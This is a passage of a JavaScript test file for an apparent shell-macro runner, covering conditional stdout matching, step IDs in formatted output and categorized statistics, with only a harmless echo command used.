  assert(!rMissingStdout.steps[0].ok,
    `Should fail, got ok=${rMissingStdout.steps[0]?.ok}`);
  assert(rMissingStdout.steps[0].error && rMissingStdout.steps[0].error.includes('Unknown'),
    `Error should say Unknown, got: ${rMissingStdout.steps[0]?.error}`);
});

// ================================================================
// v0.1.6: stdout_contains("") — empty string matches everything
// ================================================================
console.log('\n📦 39. stdout_contains empty string (v0.1.6 P1)');
const rEmptyContains = runMacro([
  { type: 'shell', command: ECHO, description: 'Output hello' },
  { type: 'conditional',
    condition: 'step[0].stdout_contains("")',
    description: 'Empty pattern',
    then: [{ type: 'shell', command: ECHO, description: 'Should run' }],
  },
]);
test('stdout_contains("") is true', () => {
  assert(rEmptyContains.steps[1].condition_met === true,
    `Empty string should match, got ${rEmptyContains.steps[1]?.condition_met}`);
});

// ================================================================
// v0.1.6: Step ID in formatted results
// ================================================================
console.log('\n📦 40. Step ID in formatted results (v0.1.6 P2)');
const rFmt = runMacro([
  { type: 'shell', command: ECHO, id: 'audit_me', description: 'Auditable' },
]);
const formatted = formatMacroResult(rFmt, 'summary');
test('step ID appears in formatted output', () => {
  assert(formatted.steps[0].id === 'audit_me',
    `Expected id=audit_me, got ${formatted.steps[0]?.id}`);
});

// ================================================================
// v0.1.6: Categorized stats
// ================================================================
console.log('\n📦 41. Categorized stats (v0.1.6 P1)');
test('getStats has categorized fields', () => {
  const stats = getStats();
  assert(typeof stats.requests_total === 'number');
  assert(typeof stats.completed === 'number');
  assert(typeof stats.failed === 'number');
  assert(typeof stats.dry_runs === 'number');
  assert(typeof stats.approval_blocked === 'number');
  assert(typeof stats.validation_failed === 'number');
});

// ================================================================
console.log(`\n${'='.repeat(40)}`);
console.log(`Results: ${passed} passed, ${failed} failed`);
if (failed > 0) process.exit(1);
